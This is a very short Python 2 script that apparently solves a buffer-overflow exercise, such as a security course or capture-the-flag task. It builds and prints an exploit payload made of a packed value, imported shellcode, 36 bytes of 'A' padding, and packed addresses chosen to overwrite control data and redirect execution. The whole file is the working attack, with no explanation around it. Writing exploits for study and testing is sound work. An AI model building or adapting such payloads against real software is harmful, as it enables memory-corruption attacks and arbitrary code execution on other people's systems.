from shellcode import shellcode
from struct import pack

print pack("<I", 0x40000000) + shellcode + "A"*36 + pack("<I", 0xfeed0061) + pack("<I", 0x616161bf)

